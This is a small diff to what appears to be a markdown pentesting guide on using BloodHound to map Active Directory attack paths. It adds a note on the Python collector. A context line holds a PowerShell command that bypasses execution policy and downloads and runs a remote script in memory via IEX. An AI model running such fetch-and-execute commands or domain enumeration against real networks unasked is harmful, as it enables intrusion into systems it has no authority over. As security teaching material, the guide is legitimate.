@@ -12,6 +12,11 @@ Use BloodHound to find compromission paths. First execute the collector on a hos
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1’);Invoke-BloodHound"
 ```
 
+On Linux, you can use the python version. More information here : https://github.com/fox-it/BloodHound.py
+```markdown
+python3 bloodhound.py -u XXX -dc DOMAIN
+```
+
 The tool give you a zip file, that you have to send to a Neo4j database. Start the Neo4j database :
 
 ```markdown
